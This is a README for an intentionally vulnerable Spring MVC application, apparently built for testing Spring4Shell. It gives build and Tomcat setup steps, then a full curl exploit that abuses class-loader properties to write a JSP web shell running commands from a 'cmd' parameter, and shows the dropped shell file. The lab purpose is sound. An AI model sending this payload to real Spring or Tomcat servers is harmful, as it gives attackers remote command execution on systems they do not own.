# Intentionally Vulnerable Spring Framework Application

This application is vulnerable to Spring4Shell.

## How do I use this?

First, this was tested on Ubuntu 21.04 (because I hate myself) and OpenJDK 11. Once you've accepted that, snag the code and build it.

```
git clone https://github.com/jbaines-r7/spring4shell_vulnapp.git
cd spring4shell_vulnapp
mvn package
```

That should generate a war file in target. You can load that into Tomcat. How? Something like:

```
wget https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.77/bin/apache-tomcat-8.5.77.zip
unzip apache-tomcat-8.5.77.zip
chmod +x apache-tomcat-8.5.77/bin/*.sh
cp target/vulnerable-1.0.0.0.war apache-tomcat-8.5.77/webapps/
./apache-tomcat-8.5.77/bin/startup.sh
```

It should be ready to test! The orginal Tomcat webshell exploit is good as far as I'm concerned:

```
curl -vv -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://localhost:8080/vulnerable-1.0.0.0/rapid7
```

The file is dropped to disk:

```
cat ./apache-tomcat-8.5.77/webapps/ROOT/tomcatwar.jsp 
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))3D-1){ out.println(new String(b)); } } -
```

Done!

## Credit

This is a modified version of [Ramesh Fadatare's](https://github.com/RameshMF) [Spring MVC Tutorial: Helloworld Example](https://github.com/RameshMF/spring-mvc-tutorial/tree/master/springmvc5-helloworld-exmaple). Thank you Ramesh for the easy to use code.
